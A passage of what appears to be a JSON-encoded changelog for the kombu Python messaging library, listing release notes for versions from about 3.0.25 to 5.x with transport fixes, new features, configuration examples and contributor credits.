Uddin\n\n- Wheels are no longer universal.\n- Revert \"Added redis transport key_prefix from envvars\".\n- Redis Transport: Small improvements of `SentinelChannel` (1253).\n- Fix pidbox not using default channels.\n- Revert \"on worker restart - restore visible regardless to time (905)\".\n- Add vine to dependencies.\n- Pin urllib3<1.26 to fix failing unittests.\n- Add timeout to producer publish (1269).\n- Remove python2 compatibility code (1277).\n- redis: Support Sentinel with SSL.\n- Support for Azure Service Bus 7.0.0 (1284).\n- Allow specifying session token (1283).\n- kombu/asynchronous/http/curl: implement _set_timeout.\n- Disable namedtuple to object feature in simplejson (1297).\n- Update to tox docker 2.0.\n- SQS back-off policy (1301).\n- Fixed SQS unittests.\n- Fix: non kombu json message decoding in SQS transport (1306).\n- Add Github Actions CI (1309).\n- Update default pickle protocol version to 4 (1314).\n- Update connection.py (1311).\n- Drop support for the lzma backport.\n- Drop obsolete code importing pickle (1315).\n- Update default login method for librabbitmq and pyamqp (936).\n- SQS Broker - handle STS authentication with AWS (1322).\n- Min py-amqp version is v5.0.6 (1325).\n- Numerous docs & example fixes.\n- Use a thread-safe implementation of cached_property (1316).\n\n\n.. _version-5.0.2:\n\n", "4.6.11": "=======\n:release-date: 2020-06-24 1.15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert incompatible changes in 1193 and additional improvements (1211)\n- Default_channel should reconnect automatically (1209)\n\n\n.. _version-4.6.10:\n\n", "4.6.10": "======\n:release-date: 2020-06-03 10.45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Doc improvement.\n- set _connection in _ensure_connection (1205)\n- Fix for the issue 1172\n- reuse connection [bug fix]\n\n\n.. _version-4.6.9:\n\n", "4.6.9": "=====\n:release-date: 2020-06-01 14.00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Prevent failure if AWS creds are not explicitly defined on predefined.\n- Raise RecoverableConnectionError in maybe_declare with retry on and.\n- Fix for the issue 1172 .\n- possible fix for 1174 .\n- Fix: make SQLAlchemy Channel init thread-safe\n- Added integration testing infrastructure for RabbitMQ\n- Initial redis integration tests implementation\n- SQLAlchemy transport: Use Query.with_for_update() instead of deprecated\n- Fix Consumer Encoding\n- Added Integration tests for direct, topic and fanout exchange types\n- Added TTL integration tests\n- Added integration tests for priority queues\n- fix 100% cpu usage on linux while using sqs\n- Modified Mutex to use redis LuaLock implementation\n- Fix: eliminate remaining race conditions from SQLAlchemy Channel\n- Fix connection imaybe_declare (1196)\n- Fix for issue 1198: Celery crashes in cases where there aren\u2019t enough\n- Ensure connection when connecting to broker\n- update pyamqp to 2.6 with optional cythonization\n\n.. _version-4.6.8:\n\n", "4.6.8": "=====\n:release-date: 2020-03-29 20:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Added support for health_check_interval option in broker_transport_options (1145)\n- Added retry_on_timeout parameter to Redis Channel (1150)\n- Added support for standard values for ssl_cert_reqs query parameter for Redis (1139)\n- Added predefined_queues option to SQS transport (1156)\n- Added ssl certificate verification against ca certificates when amqps is used for pyamqp transport (1151)\n- Fix issue (701) where kombu.transport.redis.Mutex is broken in python 3 (1141)\n- Fix brop error in Redis Channel (1144)\n\n.. _version-4.6.7:\n\n", "4.6.7": "=====\n:release-date: 2019-12-07 20:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use importlib.metadata from the standard library on Python 3.8+ (1086).\n- Add peek lock settings to be changed using transport options (1119).\n- Fix redis health checks (1122).\n- Reset ready before execute callback (1126).\n- Add missing parameter queue_args in kombu.connection.SimpleBuffer (1128)\n\n.. _version-4.6.6:\n\n", "4.6.6": "=====\n:release-date: 2019-11-11 00:15 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert _lookup_direct and related changes of redis.\n- Python 3.8 support\n- Fix 'NoneType' object has no attribute 'can_read' bug of redis transport\n- Issue 1019 Fix redis transport socket timeout\n- Add wait timeout settings to receive queue message (1110)\n- Bump py-amqp to 2.5.2\n\n.. _version-4.6.5:\n\n", "4.6.5": "=====\n:release-date: 2019-09-30 19:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert _lookup api and correct redis implemetnation.\n- Major overhaul of redis test cases by adding more full featured fakeredis module.\n- Add more test cases to boost coverage of kombu redis transport.\n- Refactor the producer consumer test cases to be based on original mocks and be passing\n- Fix lingering line length issue in test.\n- Sanitise url when include_password is false\n- Pinned pycurl to 7.43.0.2 as it is the latest build with wheels provided\n- Bump py-amqp to 2.5.2\n\n\n.. _version-4.6.4:\n\n", "4.6.4": "=====\n:release-date: 2019-08-14 22:45 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Use importlib-metadata instead of pkg_resources for better performance\n- Allow users to switch URLs while omitting the resource identifier (1032)\n- Don't stop receiving tasks on 503 SQS error. (1064)\n- Fix maybe declare (1066)\n- Revert \"Revert \"Use SIMEMBERS instead of SMEMBERS to check for queue (Redis Broker)\n- Fix MongoDB backend to work properly with TTL (1076)\n- Make sure that max_retries=0 is treated differently than None (1080)\n- Bump py-amqp to 2.5.1\n\n\n.. _version-4.6.3:\n\n", "4.6.3": "=====\n:release-date: 2019-06-15 12:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Revert FastUUID for kombu 4.6\n\n\n.. _version-4.6.2:\n\n", "4.6.2": "=====\n:release-date: 2019-06-15 12:45 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix sbugs and regressions\n\n\n.. _version-4.6.1:\n\n", "4.6.1": "=====\n:release-date: 2019-06-06 10:30 A.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix some newly introduced bug in kombu 4.6\n\n.. _version-4.6.0:\n\n", "4.6.0": "=====\n:release-date: 2019-05-30 15:30 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Dropped python 3.4\n\n- Bump py-amqp to 2.5.0\n\n- Use SIMEMBERS instead of SMEMBERS to check for queue (redis broker)\n\n  * Add `_lookup_direct` method to virtual channel. (994)\n\n  Add possibility to optimize lookup for queue in direct\n  exchange set.\n\n  * Add `_lookup_direct` method to redis virtual channel. (994)\n\n  Use `SISMEMBER` instead of `SMEMBERS` command to check if queue\n  exists in a set. Time complexity is increased from O(N) to O(1)\n  where N is the set cardinality.\n\n  Contributed by **Stevan Milic** and **Asif Saif Uddin**\n\n- Include priority in properties only if it's not None.\n  Since we attempt to serialize the priority property if it exists\n  in the dictionary it must be an integer.\n\n  Contributed by **Omer Katz**\n\n- Removed dangerous default mutable arguments from function\n  definitions where appropriate.\n\n  Contributed by **Todd Cook**\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n  - **Asif Saif Uddin**\n\n.. _version-4.5.0:\n\n", "4.5.0": "=====\n:release-date: 2019-03-3 18:30 P.M UTC+3:00\n:release-by: Omer Katz\n\n- The Redis transport now supports a custom separator for keys.\n\n  Previously when storing a key in Redis which represents a queue\n  we used the hardcored value ``\\x06\\x16`` separator to store\n  different attributes of the queue in the queue's name.\n\n  The separator is now configurable using the sep\n  transport option:\n\n  .. code-block:: python\n\n    with Connection('redis://', transport_options={\n            'sep': ':',\n        }):\n         ...\n        pass\n\n  Contributed by **Joris Beckers**\n\n- When the SQS server returns a timeout we ignore it and keep trying\n  instead of raising an error.\n\n  This will prevent Celery from raising an error and hanging.\n\n  Contributed by **Erwin Rossen**\n\n- Properly declare async support for the Qpid transport.\n\n  If you are using this transport we strongly urge you to upgrade.\n\n  Contributed by **Rohan McGovern**\n\n- Revert `celery/kombu906 <https://github.com/celery/kombu/pull/906>`_ and\n  introduce unique broadcast queue names as an optional keyword argument.\n\n  If you want each broadcast queue to have a unique name specify `unique=True`:\n\n  .. code-block:: pycon\n\n    >>> from kombu.common import Broadcast\n    >>> q = Broadcast(queue='foo', unique=True)\n    >>> q.name\n    'foo.7ee1ac20-cda3-4966-aaf8-e7a3bb548688'\n    >>> q = Broadcast(queue='foo')\n    >>> q.name\n    'foo'\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n\n.. _version-4.4.0:\n\n", "4.4.0": "=====\n:release-date: 2019-03-3 9:00 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Restore bz2 import checks in compression module.\n\n  The checks were removed in `celery/kombu938 <https://github.com/celery/kombu/pull/938>`_ due to assumption that it only affected Jython.\n  However, bz2 support can be missing in Pythons built without bz2 support.\n\n  Contributed by **Patrick Woods**\n\n- Fix regression that occurred in 4.3.0\n  when parsing  Redis Sentinel master URI containing password.\n\n  Contributed by **Peter Lithammer**\n\n- Handle the case when only one Redis Sentinel node is provided.\n\n  Contributed by **Peter Lithammer**\n\n- Support SSL URL parameters correctly for `rediss://`` URIs.\n\n  Contributed by **Paul Bailey**\n\n- Revert `celery/kombu954 <https://github.com/celery/kombu/pull/954>`_.\n  Instead bump the required redis-py dependency to 3.2.0\n  to include this fix `andymccurdy/redis-py4e1e748 <https://github.com/andymccurdy/redis-py/commit/4e1e74809235edc19e03edb79c97c80a3e4e9eca>`_.\n\n  Contributed by **Peter Lithammer**\n\n- Added support for broadcasting using a regular expression pattern\n  or a glob pattern to multiple Pidboxes.\n\n  Contributed by **Jason Held**\n\n.. _version-4.3.0:\n\n", "4.3.0": "=====\n:release-date: 2019-01-14 7:00 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Added Python 3.7 support.\n\n  Contributed by **Omer Katz**, **Mads Jensen** and **Asif Saif Uddin**\n\n- Avoid caching queues which are declared with a TTL.\n\n  Queues that are declared with a TTL are now also be excluded from the\n  in-memory cache in case they expire between publishes on the same channel.\n\n  Contributed by **Matt Yule-Bennett**\n\n- Added an index to the Message table for the SQLAlchemy transport.\n\n  The index allows to effectively sorting the table by the message's timestamp.\n\n  .. note::\n\n    We do not provide migrations for this model yet.\n    You will need to add the index manually if you are already\n    using the SQLAlchemy transport.\n\n    The syntax may vary between databases.\n    Please refer to your database's documentation for instructions.\n\n  Contributed by **Mikhail Shcherbinin**\n\n- Added a timeout that limits the amount of time we retry\n  to reconnect to a transport.\n\n  Contributed by **:github_user:`tothegump`**\n\n- :class:``celery.asynchronous.hub.Hub`` is now reentrant.\n\n  This allows calling :func:`celery.bin.celery.main` to revive a worker in\n  the same process after rescuing from shutdown (:class:``SystemExit``).\n\n  Contributed by **Alan Justino da Silva**\n\n- Queues now accept string exchange names as arguments as documented.\n\n  Tests were added to avoid further regressions.\n\n  Contributed by **Antonio Gutierrez**\n\n- Specifying names for broadcast queues now work as expected.\n\n  Previously, named broadcast queues did not create multiple queues per worker.\n  They incorrectly declared the named queue which resulted in one queue per\n  fanout exchange, thus missing the entire point of a fanout exchange.\n  The behavior is now matched to unnamed broadcast queues.\n\n  Contributed by **Kuan Hsuan-Tso**\n\n- When initializing the Redis transport in conjunction with gevent\n  restore all unacknowledged messages to queue.\n\n  Contributed by **Gal Cohen**\n\n- Allow :class:``kombu.simple.SimpleQueue`` to pass queue_arguments to Queue object.\n\n  This allows :class:``kombu.simple.SimpleQueue`` to connect to RabbitMQ queues with\n  custom arguments like 'x-queue-mode'='lazy'.\n\n  Contributed by **C Blue Neeh**\n\n- Add support for 'rediss' scheme for secure Redis connections.\n\n  The rediss scheme defaults to the least secure form, as\n  there is no suitable default location for `ca_certs`. The recommendation\n  would still be to follow the documentation and specify `broker_use_ssl` if\n  coming from celery.\n\n  Contributed by **Daniel Blair**\n\n- Added the Azure Storage Queues transport.\n\n  The transport is implemented on top of Azure Storage\n  Queues. This offers a simple but scalable and low-cost PaaS\n  transport for Celery users in Azure. The transport is intended to be\n  used in conjunction with the Azure Block Blob Storage backend.\n\n  Contributed by **Clemens Wolff**, **:github_user:`ankurokok`**,\n  **Denis Kisselev**, **Evandro de Paula**, **Martin Peck**\n  and **:github_user:`michaelperel`**\n\n- Added the Azure Service Bus transport.\n\n  The transport is implemented on top of Azure Service Bus and\n  offers PaaS support for more demanding Celery workloads in Azure.\n  The transport is intended to be used in conjunction with the Azure\n  CosmosDB backend.\n\n  Contributed by **Clemens Wolff**, **:github_user:`ankurokok`**,\n  **Denis Kisselev**, **Evandro de Paula**, **Martin Peck**\n  and **:github_user:`michaelperel`**\n\n- Drop remaining mentions of Jython support completely.\n\n  Contributed by **Asif Saif Uddin** and **Mads Jensen**\n\n- When publishing messages to the Pidbox, retry if an error occurs.\n\n  Contributed by **Asif Saif Uddin**\n\n- Fix infinite loop in :method:``kombu.asynchronous.hub.Hub.create_loop``.\n\n  Previous attempt to fix the problem (PR kombu/760) did not consider\n  an edge case. It is now fixed.\n\n  Contributed by **Vsevolod Strukchinsky**\n\n- Worker shutdown no longer duplicates messages when using the SQS broker.\n\n  Contributed by **Mintu Kumar Sah**\n\n- When using the SQS broker, prefer boto's default region before our hardcoded default.\n\n  Contributed by **Victor Villas**\n\n- Fixed closing of shared redis sockets which previously caused Celery to hang.\n\n  Contributed by **Alexey Popravka**\n\n- the `Pyro`_ transport (:mod:`kombu.transport.pyro`) now works with\n  recent Pyro versions. Also added a Pyro Kombu Broker that this transport\n  needs for its queues.\n\n  Contributed by **Irmen de Jong**\n\n- Handle non-base64-encoded SQS messages.\n\n  Fix contributed by **Tim Li**, **Asif Saif Uddin** and **Omer Katz**.\n\n- Move the handling of Sentinel failures to the redis library itself.\n\n  Previously, Redis Sentinel worked only if the first node's sentinel\n  service in the URI was up. A server outage would have caused downtime.\n\n  Contributed by **Brian Price**\n\n- When using Celery and the pickle serializer with binary data as part of the\n  payload, `UnicodeDecodeError` would be raised as the content was not utf-8.\n  We now replace on errors.\n\n  Contributed by **Jian Dai**\n\n- Allow setting :method:``boto3.sqs.create_queue`` Attributes via transport_options.\n\n  Contributed by **Hunter Fernandes**\n\n- Fixed infinite loop when entity.channel is replaced by revive() on connection\n  drop.\n\n  Contributed by **Tzach Yarimi**\n\n- Added optional support for Brotli compression.\n\n  Contributed by **Omer Katz**\n\n- When using the SQS broker, FIFO queues with names that ended with the 'f' letter\n  were incorrectly parsed. This is now fixed.\n\n  Contributed by **Alex Vishnya** and **Ilya Konstantinov**\n\n-  Added optional support for LZMA compression.\n\n  Contributed by **Omer Katz**\n\n- Added optional support for ZStandard compression.\n\n  Contributed by **Omer Katz**\n\n- Require py-amqp 2.4.0 as the minimum version.\n\n  Contributed by **Asif Saif Uddin**\n\n- The value of DISABLE_TRACEBACKS environment variable is now respected on debug, info\n  and warning logger level.\n\n  Contributed by **Ludovic Rivallain**\n\n- As documented in kombu/741 and eventlet/eventlet415\n  there is a mismatch between the monkey-patched eventlet queue\n  and the interface Kombu is expecting.\n  This causes Celery to crash when the `broker_pool_limit`\n  configuration option is set\n  eventlet/eventlet415 suggests that the mutex can be a noop.\n  This is now the case.\n\n  Contributed by **Josh Morrow**\n\n- Codebase improvements and fixes by:\n\n  - **Omer Katz**\n  - **Mads Jensen**\n  - **Asif Saif Uddin**\n  - **Lars Rinn**\n\n- Documentation improvements by:\n\n  - **Jon Dufresne**\n  - **Fay Cheng**\n  - **Asif Saif Uddin**\n  - **Kyle Verhoog**\n  - **Noah Hall**\n  - **:github_user:`brabiega`**\n\n.. _version-4.2.2-post1:\n\n", "4.2.2post1": "===========\n:release-date: 2019-01-01 04:00 P.M IST\n:release-by: Omer Katz\n\n.. note::\n\n  The previous release contained code from master.\n  It is now deleted from PyPi.\n  Please use this release instead.\n\n- No changes since previous release.\n\n.. _version-4.2.2:\n\n", "4.2.2": "=====\n:release-date: 2018-12-06 04:30 P.M IST\n:release-by: Omer Katz\n\n- Support both Redis client version 2.x and version 3.x.\n\n  Contributed by **Ash Berlin-Taylor** and **Jeppe Fihl-Pearson**\n\n.. _version-4.2.1:\n\n", "4.2.1": "=====\n:release-date: 2018-05-21 09:00 A.M IST\n:release-by: Omer Katz\n\n.. note::\n\n  The 4.2.0 release contained remains of the ``async`` module by accident.\n  This is now fixed.\n\n- Handle librabbitmq fileno raising a ValueError when socket is not connected.\n\n  Contributed by **Bryan Shelton**\n\n.. _version-4.2.0:\n\n", "4.0": "===\n:release-date: 2016-10-28 16:45 P.M UTC\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 2.0.\n\n    The new py-amqp version have been refactored for better performance,\n    using modern Python socket conventions, and API consistency.\n\n- No longer depends on :mod:`anyjson`.\n\n    Kombu will now only choose between :pypi:`simplejson` and the built-in\n    :mod:`json`.\n\n    Using the latest version of simplejson is recommended:\n\n    .. code-block:: console\n\n        $ pip install -U simplejson\n\n- Removed transports that are no longer supported in this version:\n\n    - Django ORM transport\n    - SQLAlchemy ORM transport\n    - Beanstalk transport\n    - ZeroMQ transport\n    - amqplib transport (use pyamqp).\n\n- API Changes\n\n    * Signature of :class:`kombu.Message` now takes body as first argment.\n\n        It used to be ``Message(channel, body=body, **kw)``, but now it's\n        ``Message(body, channel=channel, **kw)``.\n\n        This is unlikey to affect you, as the Kombu API does not have\n        users instantiate messages manually.\n\n- New SQS transport\n\n    Donated by NextDoor, with additional contributions from mdk.\n\n    .. note::\n\n        ``kombu[sqs]`` now depends on :pypi:`pycurl`.\n\n- New Consul transport.\n\n    Contributed by **Wido den Hollander**.\n\n- New etcd transport.\n\n    Contributed by **Stephen Milner**.\n\n- New Qpid transport.\n\n    It was introduced as an experimental transport in Kombu 3.0, but is now\n    mature enough to be fully supported.\n\n    Created and maintained by **Brian Bouterse**.\n\n- Redis: Priority 0 is now lowest, 9 is highest.\n  (**backward incompatible**)\n\n    This to match how priorities in AMQP works.\n\n    Fix contributed by **Alex Koshelev**.\n\n- Redis: Support for Sentinel\n\n    You can point the connection to a list of sentinel URLs like:\n\n    .. code-block:: text\n\n        sentinel://0.0.0.0:26379;sentinel://0.0.0.0:26380/...\n\n    where each sentinel is separated by a `;`. Multiple sentinels are handled\n    by :class:`kombu.Connection` constructor, and placed in the alternative\n    list of servers to connect to in case of connection failure.\n\n   Contributed by **Sergey Azovskov**, and **Lorenzo Mancini**\n\n- RabbitMQ Queue Extensions\n\n    New arguments have been added to :class:`kombu.Queue` that lets\n    you directly and conveniently configure the RabbitMQ queue extensions.\n\n    - ``Queue(expires=20.0)``\n\n        Set queue expiry time in float seconds.\n\n        See :attr:`kombu.Queue.expires`.\n\n    - ``Queue(message_ttl=30.0)``\n\n        Set queue message time-to-live float seconds.\n\n        See :attr:`kombu.Queue.message_ttl`.\n\n    - ``Queue(max_length=1000)``\n\n        Set queue max length (number of messages) as int.\n\n        See :attr:`kombu.Queue.max_length`.\n\n    - ``Queue(max_length_bytes=1000)``\n\n        Set queue max length (message size total in bytes) as int.\n\n        See :attr:`kombu.Queue.max_length_bytes`.\n\n    - ``Queue(max_priority=10)``\n\n        Declare queue to be a priority queue that routes messages\n        based on the ``priority`` field of the message.\n\n        See :attr:`kombu.Queue.max_priority`.\n\n- RabbitMQ: ``Message.ack`` now supports the ``multiple`` argument.\n\n    If multiple is set to True, then all messages received before\n    the message being acked will also be acknowledged.\n\n- ``amqps://`` can now be specified to require SSL (Issue 610).\n\n- ``Consumer.cancel_by_queue`` is now constant time.\n\n- ``Connection.ensure*`` now raises :exc:`kombu.exceptions.OperationalError`.\n\n    Things that can be retried are now reraised as\n    :exc:`kombu.exceptions.OperationalError`.\n\n- Redis: Fixed SSL support.\n\n    Contributed by **Robert Kolba**.\n\n- New ``Queue.consumer_arguments`` can be used for the ability to\n  set consumer priority via ``x-priority``.\n\n  See https://www.rabbitmq.com/consumer-priority.html\n\n  Example:\n\n  .. code-block:: python\n\n        Queue(\n            'qname',\n            exchange=Exchange('exchange'),\n            routing_key='qname',\n            consumer_arguments={'x-priority': 3},\n        )\n\n- Queue/Exchange: ``no_declare`` option added (also enabled for\n  internal amq. exchanges) (Issue 565).\n\n- JSON serializer now calls ``obj.__json__`` for unsupported types.\n\n    This means you can now define a ``__json__`` method for custom\n    types that can be reduced down to a built-in json type.\n\n    Example:\n\n    .. code-block:: python\n\n        class Person:\n            first_name = None\n            last_name = None\n            address = None\n\n            def __json__(self):\n                return {\n                    'first_name': self.first_name,\n                    'last_name': self.last_name,\n                    'address': self.address,\n                }\n\n- JSON serializer now handles datetimes, Django promise, UUID and Decimal.\n\n- Beanstalk: Priority 0 is now lowest, 9 is highest.\n  (**backward incompatible**)\n\n    This to match how priorities in AMQP works.\n\n    Fix contributed by **Alex Koshelev**.\n\n- Redis: now supports SSL using the ``ssl`` argument to\n  :class:`~kombu.Connection`.\n\n- Redis: Fanout exchanges are no longer visible between vhosts,\n  and fanout messages can be filtered by patterns.\n  (**backward incompatible**)\n\n    It was possible to enable this mode previously using the\n    ``fanout_prefix``, and ``fanout_patterns``\n    transport options, but now these are enabled by default.\n\n    If you want to mix and match producers/consumers running different\n    versions you need to configure your kombu 3.x clients to also enable\n    these options:\n\n    .. code-block:: pycon\n\n        >>> Connection(transport_options={\n            'fanout_prefix': True,\n            'fanout_patterns': True,\n        })\n\n- Pidbox: Mailbox new arguments: TTL and expiry.\n\n    Mailbox now supports new arguments for controlling\n    message TTLs and queue expiry, both for the mailbox\n    queue and for reply queues.\n\n    - ``queue_expires`` (float/int seconds).\n    - ``queue_ttl`` (float/int seconds).\n    - ``reply_queue_expires`` (float/int seconds).\n    - ``reply_queue_ttl`` (float/int seconds).\n\n    All take seconds in int/float.\n\n    Contributed by **Alan Justino**.\n\n- Exchange.delivery_mode now defaults to :const:`None`, and the default\n  is instead set by ``Producer.publish``.\n\n- :class:`~kombu.Consumer` now supports a new ``prefetch_count`` argument,\n  which if provided will force the consumer to set an initial prefetch count\n  just before starting.\n\n- Virtual transports now stores ``priority`` as a property, not in\n  ``delivery_info``, to be compatible with AMQP.\n\n- ``reply_to`` argument to ``Producer.publish`` can now be\n  :class:`~kombu.Queue` instance.\n\n- Connection: There's now a new method\n  ``Connection.supports_exchange_type(type)`` that can be used to check if the\n  current transport supports a specific exchange type.\n\n- SQS: Consumers can now read json messages not sent by Kombu.\n\n    Contributed by **Juan Carlos Ferrer**.\n\n- SQS: Will now log the access key used when authentication fails.\n\n    Contributed by **Hank John**.\n\n- Added new :class:`kombu.mixins.ConsumerProducerMixin` for consumers that\n  will also publish messages on a separate connection.\n\n- Messages: Now have a more descriptive ``repr``.\n\n    Contributed by **Joshua Harlow**.\n\n- Async: HTTP client based on curl.\n\n- Async: Now uses `poll` instead of `select` where available.\n\n- MongoDB: Now supports priorities\n\n    Contributed by **Alex Koshelev**.\n\n- Virtual transports now supports multiple queue bindings.\n\n    Contributed by **Federico Ficarelli**.\n\n- Virtual transports now supports the anon exchange.\n\n    If when publishing a message, the exchange argument is set to '' (empty\n    string), the routing_key will be regarded as the destination queue.\n\n    This will bypass the routing table compeltely, and just deliver the\n    message to the queue name specified in the routing key.\n\n- Zookeeper: Transport now uses the built-in suport in kazoo to handle\n  failover when using a list of server names.\n\n    Contributed by **Joshua Harlow**.\n\n- ConsumerMixin.run now passes keyword arguments to .consume.\n\nDeprecations and removals\n-------------------------\n\n- The deprecated method ``Consumer.add_queue_from_dict`` has been removed.\n\n    Use instead:\n\n    .. code-block:: python\n\n        consumer.add_queue(Queue.from_dict(queue_name, **options))\n\n- The deprecated function ``kombu.serialization.encode`` has been removed.\n\n    Use :func:`kombu.serialization.dumps` instead.\n\n- The deprecated function ``kombu.serialization.decode`` has been removed.\n\n    Use :func:`kombu.serialization.loads` instead.\n\n- Removed module ``kombu.syn``\n\n    ``detect_environment`` has been moved to kombu.utils.compat\n\n.. _version-3.0.37:\n\n", "3.0.37": "======\n:release-date: 2016-10-06 05:00 P.M PDT\n:release-by: Ask Solem\n\n- Connection: Return value of ``.info()`` was no longer JSON serializable,\n  leading to \"itertools.cycle object not JSON serializable\"\n  errors (Issue 635).\n\n.. _version-3.0.36:\n\n", "3.0.36": "======\n:release-date: 2016-09-30 03:06 P.M PDT\n:release-by: Ask Solem\n\n- Connection: Fixed bug when cloning connection with alternate urls.\n\n    Fix contributed by Emmanuel Cazenave.\n\n- Redis: Fixed problem with unix socket connections.\n\n    https://github.com/celery/celery/issues/2903\n\n    Fix contributed by Raphael Michel.\n\n- Redis: Fixed compatibility with older redis-py versions (Issue 576).\n\n- Broadcast now retains queue name when being copied/pickled (Issue 578).\n\n.. _version-3.0.35:\n\n", "3.0.35": "======\n:release-date: 2016-03-22 11:22 P.M PST\n:release-by: Ask Solem\n\n- msgpack: msgpack support now requires msgpack-python > 0.4.7.\n\n- Redis: TimeoutError was no longer handled as a recoverable error.\n\n- Redis: Adds the ability to set more Redis connection options\n  using ``Connection(transport_options={...})``.\n\n    - ``socket_connect_timeout``\n    - ``socket_keepalive`` (requires :mod:`redis-py` > 2.10)\n    - ``socket_keepalive_options`` (requires :mod:`redis-py` > 2.10)\n\n- msgpack: Fixes support for binary/unicode data\n\n.. _version-3.0.34:\n\n", "3.0.34": "======\n:release-date: 2016-03-03 05:30 P.M PST\n:release-by: Ask Solem\n\n- Qpid: Adds async error handling.\n\n    Contributed by Brian Bouterse.\n\n- Qpid: Delivery tag is now a UUID4 (Issue 563).\n\n    Fix contributed by Brian Bouterse.\n\n- Redis: Connection.as_uri() returned malformed URLs when the\n  ``redis+socket`` scheme was ised (Issue celery/celery2995).\n\n- msgpack: Use binary encoding instead of utf-8 (Issue 570).\n\n.. _version-3.0.33:\n\n", "3.0.33": "======\n:release-date: 2016-01-08 06:36 P.M PST\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.9.\n\n- Redis: Fixed problem with auxilliary connections causing the main\n  consumer connection to be closed (Issue 550).\n\n- Qpid: No longer uses threads to operate, to ensure compatibility with\n  all environments (Issue 531).\n\n.. _version-3.0.32:\n\n", "3.0.32": "======\n:release-date: 2015-12-16 02:29 P.M PST\n:release-by: Ask Solem\n\n- Redis: Fixed bug introduced in 3.0.31 where the redis transport always\n  connects to localhost, regardless of host setting.\n\n.. _version-3.0.31:\n\n", "3.0.31": "======\n:release-date: 2015-12-16 12:00 P.M PST\n:release-by: Ask Solem\n\n- Redis: Fixed bug introduced in 3.0.30 where socket was prematurely\n  disconnected.\n\n- Hub: Removed debug logging message: \"Deregistered fd...\" (Issue 549).\n\n.. _version-3.0.30:\n\n", "3.0.30": "======\n:release-date: 2015-12-07 12:28 A.M PST\n:release-by: Ask Solem\n\n- Fixes compatiblity with uuid in Python 2.7.11 and 3.5.1.\n\n    Fix contributed by Kai Groner.\n\n- Redis transport: Attempt at fixing problem with hanging consumer\n  after disconnected from server.\n\n- Event loop:\n    Attempt at fixing issue with 100% CPU when using the Redis transport,\n\n- Database transport: Fixed oracle compatiblity.\n\n    An \"ORA-00907: missing right parenthesis\" error could manifest when using\n    an Oracle database with the database transport.\n\n    Fix contributed by Deepak N.\n\n- Documentation fixes\n\n    Contributed by Tommaso Barbugli.\n\n.. _version-3.0.29:\n\n", "3.0.29": "======\n:release-date: 2015-10-26 11:10 A.M PDT\n:release-by: Ask Solem\n\n- Fixed serialization issue for ``bindings.as_dict()`` (Issue 453).\n\n    Fix contributed by Sergey Tikhonov.\n\n- Json serializer wrongly treated bytes as ``ascii``, not ``utf-8``\n  (Issue 532).\n\n- MongoDB: Now supports pymongo 3.x.\n\n    Contributed by Len Buckens.\n\n- SQS: Tests passing on Python 3.\n\n    Fix contributed by Felix Yan\n\n.. _version-3.0.28:\n\n", "3.0.28": "======\n:release-date: 2015-10-12 12:00 PM PDT\n:release-by: Ask Solem\n\n.. admonition:: Django transport migrations.\n\n    If you're using Django 1.8 and have already created the\n    kombu_transport_django tables, you have to run a fake initial migration:\n\n    .. code-block:: console\n\n        $ python manage.py migrate kombu_transport_django --fake-initial\n\n- No longer compatible with South by default.\n\n    To keep using kombu.transport.django with South migrations\n    you now need to configure a new location for the kombu migrations:\n\n    .. code-block:: python\n\n        SOUTH_MIGRATION_MODULES = {\n            'kombu_transport_django':\n                'kombu.transport.django.south_migrations',\n        }\n\n- Keep old South migrations in ``kombu.transport.django.south_migrations``.\n\n- Now works with Redis < 2.10 again.\n\n.. _version-3.0.27:\n\n", "3.0.27": "======\n:release-date: 2015-10-09 3:10 PM PDT\n:release-by: Ask Solem\n\n- Now depends on :mod:`amqp` 1.4.7.\n\n- Fixed libSystem import error on some macOS 10.11 (El Capitan) installations.\n\n    Fix contributed by Eric Wang.\n\n- Now compatible with Django 1.9.\n\n- Django: Adds migrations for the database transport.\n\n- Redis: Now depends on py-redis 2.10.0 or later (Issue 468).\n\n- QPid: Can now connect as localhost (Issue 519).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Adds support for ``login_method`` (Issue 502, Issue 499).\n\n    Contributed by Brian Bouterse.\n\n- QPid: Now reads SASL mechanism from broker string (Issue 498).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Monitor thread now properly terminated on session close (Issue 485).\n\n    Fix contributed by Brian Bouterse.\n\n- QPid: Fixed file descriptor leak (Issue 476).\n\n    Fix contributed by Jeff Ortel\n\n- Docs: Fixed wrong order for entrypoint arguments (Issue 473).\n\n- ConsumerMixin: Connection error logs now include traceback (Issue 480).\n\n- BaseTransport now raises RecoverableConnectionError when disconnected\n  (Issue 507).\n\n- Consumer: Adds ``tag_prefix`` option to modify how consumer tags are\n  generated (Issue 509).\n\n.. _version-3.0.26:\n\n", "3.0.26": "======\n:release-date: 2015-04-22 06:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed compatibility with py-redis versions before 2.10.3 (Issue 470).\n\n.. _version-3.0.25:\n\n", "3.0.25": "======\n:release-date: 2015-04-21 02:00 P.M UTC\n:release-by: Ask Solem\n\n- pyamqp/librabbitmq now uses 5671 as default port when SSL is enabled\n  (Issue 459).\n\n- Redis: Now supports passwords in ``redis+socket://:passhost:port`` URLs\n  (Issue 460).\n\n- ``Producer.publish`` now defines the ``expiration`` property in support\n  of the `RabbitMQ per-message TTL extension`_.\n\n    Contributed by Anastasis Andronidis.\n\n- Connection transport attribute now 